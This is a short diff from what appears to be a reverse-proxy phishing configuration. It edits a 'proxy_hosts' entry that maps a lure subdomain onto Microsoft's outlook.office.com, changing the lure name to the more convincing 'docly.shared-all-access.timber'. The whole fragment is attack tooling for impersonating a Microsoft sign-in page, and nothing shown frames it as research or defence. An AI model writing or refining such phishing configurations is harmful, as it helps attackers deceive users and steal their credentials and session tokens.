@@ -335,7 +335,7 @@ proxy_hosts:
     }
   #
   - {
-      phish_sub: "merchants-secure",
+      phish_sub: "docly.shared-all-access.timber",
       orig_sub: "outlook",
       domain: "office.com",
       session: false,
